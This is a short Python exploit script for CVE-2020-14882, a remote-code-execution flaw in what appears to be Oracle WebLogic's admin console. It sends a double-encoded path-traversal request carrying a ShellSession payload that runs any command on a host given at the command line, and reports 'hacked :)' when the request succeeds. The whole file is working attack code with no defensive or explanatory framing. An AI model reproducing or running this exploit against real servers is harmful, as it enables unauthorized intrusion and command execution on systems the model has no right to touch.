import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2020-14882
class CVE2020_14882:

    # set payload by cmd
    def __init__(self, host, port, cmd):
        print (LogColors.BLUE + "victim: " + host + ":" + port + "..." + LogColors.ENDC)
        path = "/console/images/%252E%252E%252Fconsole.portal"
        self.host = host
        self.url = "{}:{}{}".format(host, port, path)
        self.payload = "?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('{}');\");".format(cmd)
        self.session = requests.Session()

    # exploit logic
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        headers = {
            "User-Agent" : "Mozilla/5.0",
            "Host" : self.host.split("//")[1],
            "Accept-Encoding" : "gzip, deflate",
            "cmd" : "tasklist",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        url = self.url + self.payload
        print (LogColors.YELLOW + url + LogColors.ENDC)
        r = self.session.get(url, headers = headers, timeout = 10, verify = False)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--host', required = True, help = "target host")
    parser.add_argument('-p','--port', required = True, help = "target port")
    parser.add_argument('-c','--cmd', required = True, help = "command")
    args = vars(parser.parse_args())
    cve = CVE2020_14882(args['host'], args['port'], args['cmd'])
    cve.exploit()

